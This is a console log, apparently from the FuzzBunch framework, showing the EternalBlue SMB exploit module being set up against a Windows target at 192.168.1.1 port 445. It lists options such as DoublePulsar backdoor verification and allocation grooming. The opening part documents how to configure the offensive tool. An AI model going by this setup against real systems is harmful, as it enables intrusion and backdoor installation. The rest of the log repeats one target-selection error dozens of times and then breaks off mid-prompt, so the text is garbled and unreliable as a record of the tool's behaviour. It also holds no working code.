
--[ Version 3.5.1

[*] Loading Plugins
fb > use EternalBlue

[!] Entering Plugin Context :: Eternalblue
[*] Applying Global Variables

fb Special (Eternalblue) > apply
[*] Applying Session Parameters
fb Special (Eternalblue) > echo Running Exploit Touches
[*] Running Exploit Touches
fb Special (Eternalblue) > touch all
fb Special (Eternalblue) > enter Special

fb Special (Eternalblue) > prompt confirm

[!] Enter Prompt Mode :: Eternalblue

Module: Eternalblue
===================

Name                  Value                                                 
----                  -----                                                 
NetworkTimeout        60                                                    
TargetIp              192.168.1.1                                           
TargetPort            445                                                   
VerifyTarget          False                                                 
VerifyBackdoor        True                                                  
MaxExploitAttempts    3                                                     
GroomAllocations      12                                                    
Target                WIN72K8R2                                             

[!] plugin variables are valid

[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.


[*]  TargetIp :: Target IP Address


[*]  TargetPort :: Port used by the SMB service for exploit connection


[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.


[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.


[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.


[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.


[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs

[-] Error: Invalid value for Target (1)

[*]  Target :: Operating System, Service Pack, and Architecture of target OS

    0) XP            Windows XP 32-Bit All Service Packs
